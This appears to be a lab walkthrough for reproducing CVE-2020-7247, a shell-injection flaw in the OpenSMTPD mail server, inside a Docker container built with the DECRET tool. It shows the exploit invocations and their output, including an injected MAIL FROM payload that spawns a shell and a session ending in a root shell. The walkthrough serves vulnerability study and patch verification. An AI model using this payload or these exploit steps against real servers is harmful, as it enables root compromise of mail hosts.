# CVE-2020-7247 (Remote Code Execution in opensmtpd)

### Description

CVE-2020-7247 is a vulnerability affecting OpenSMTPD, a mail server
developed by the OpenBSD project, which is also available on several
Linux distributions such as Debian.  The flaw was identified by the
Qualys Security team and disclosed in January 2020.

[The
report](https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt),
describes a shell injection in the SMTP server of `opensmtpd`, which
can lead to a Local Privilege Escalation or even a Remote Code
Execution as `root` if the server is publicly exposed.



### Reproducing a Vulnerable Environment
```shell
python decret.py --number 2020-7247 --release bullseye --directory opensmtpd --selenium --fixed-version=6.6.2p1-1~bpo10+1
```

DECRET currently has a small issue with version numbering, and we have
to hard-code the fixed version to make sure it finds the correct
information.  This should be fixed soon.

```shell
root@cve-2020-7247:/# smtpd -d
info: OpenSMTPD 6.6.1p1 starting
warn: purge_task: opendir: No such file or directory
pony express: listen: Address already in use
smtpd: process pony socket closed
```

There is actually another small with this example.  Indeed, Docker
produces a `/etc/hosts` with two `localhost` lines (one for IPv4 and
one for IPv6), and `opensmtpd` tries to bind twice on the loopback.

The simple solution here is to rewrite `localhost` as `127.0.0.1` in
the configuration file (updating `/etc/hosts` is not possible, since
the file is handled by the Docker engine):

```shell
root@cve-2020-7247:/# sed -i s/localhost/127.0.0.1/ /etc/smtpd.conf
root@cve-2020-7247:/# /etc/init.d/opensmtpd start
```

### Simple testing method

The vulnerable version of `opensmtpd` should now be running.

You can try to use one of the available exploits, such as
`/tmp/decret/exploit_2_verified`, which allows you to execute an
(almost) arbitrary command as `root` (there are size and charset
limitations, that can be overcome using various tricks, such as the
one described in Qualys advisory):

```shell
root@cve-2020-7247:/# apt install -y python3 python-is-python3
root@cve-2020-7247:/# ls /tmp/surprise
ls: cannot access '/tmp/surprise': No such file or directory
root@cve-2020-7247:/# python /tmp/decret/exploit_2_verified  127.0.0.1 25 "touch /tmp/surprise"
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
root@cve-2020-7247:/# ls /tmp/surprise
/tmp/surprise
```

You can also try to run the Local Privilege Escalation in `/tmp/decret/exploit_0_verified`:
```
root@cve-2020-7247:/# apt install -y gcc
[...]
root@cve-2020-7247:/# su toto
toto@cve-2020-7247:/$ perl /tmp/decret/exploit_0_verified LPE
raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>

< 220 cve-2020-7247 ESMTP OpenSMTPD
> HELO fnord
< 250 cve-2020-7247 Hello fnord [127.0.0.1], pleased to meet you
> MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
< 250 2.0.0 Ok
> RCPT TO:<root>
< 250 2.1.5 Destination address valid: Recipient ok
> DATA
< 354 Enter mail, end with "." on a line by itself
< 250 2.0.0 4192aeac Message accepted for delivery

Payload sent, please wait 5 seconds...
-rwsrwxrwx 1 root root 16712 May 26 17:00 /usr/local/bin/pwned
# id
uid=0(root) gid=0(root) groups=0(root),1000(toto)
# 
```

If we update `opensmtpd` in the container (you should  : 
```shell
apt-get install opensmtpd
```
The exploits do not work anymore.
